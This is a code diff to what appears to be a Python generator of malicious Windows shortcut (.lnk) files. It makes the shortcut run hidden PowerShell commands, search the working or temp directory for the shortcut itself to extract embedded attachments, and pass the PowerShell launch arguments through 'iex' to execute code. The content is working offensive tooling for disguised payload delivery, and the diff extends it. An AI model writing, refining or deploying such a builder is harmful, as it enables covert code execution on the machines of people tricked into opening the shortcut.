@@ -43,14 +43,12 @@ def append_file_to_file(file_destiny, file_to_append):
 
 
 def prepare_arguments(interpreter, command, attachments):
-    command_string = ''
-    if interpreter == "cmd":
-        command_string = r" powershell -windowstyle hidden "
+    command_string = r" powershell -windowstyle hidden "
     
     # TODO: Think if command is added or not if we have attachments
-    command_string += command 
+    command_string = command_string + command + ';'
     
-    command_string += r"; $dir = Get-Location; if($dir -Match 'System32' -or $dir -Match 'Program Files') { $dir = '%temp'}; $lnkpath = Get-ChildItem -Path $dir -Recurse *.lnk ^| where-object { $_.length -eq 0x00000000 } ^| Select-Object -ExpandProperty FullName;"
+    command_string += r"$dir = Get-Location; if($dir -Match 'System32' -or $dir -Match 'Program Files') { $dir = '%temp'}; $lnkpath = Get-ChildItem -Path $dir -Recurse *.lnk ^| where-object { $_.length -eq 0x00000000 } ^| Select-Object -ExpandProperty FullName;"
     plh_dic['00000000'] = None # Add generic placeholder
     att_num = 0
     for attachment in attachments:                
@@ -112,8 +110,11 @@ def main():
         lnk_interpreter = r"%systemroot%\SysWOW64\cmd.exe" 
         lnk_arguments = r"/c"
     elif (args.interpreter == "powershell"):
+        if (args.attachments):
+            print("Error, for the moment powershell cannot be used as interpreter with the attachment generator. Please use CMD")
+            exit(1)
         lnk_interpreter = r"%windir%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" 
-        lnk_arguments = r"-WindowStyle Hidden"
+        lnk_arguments = r"iex"
     else:
         print("Invalid interpreter provided, exiting...")
         exit()
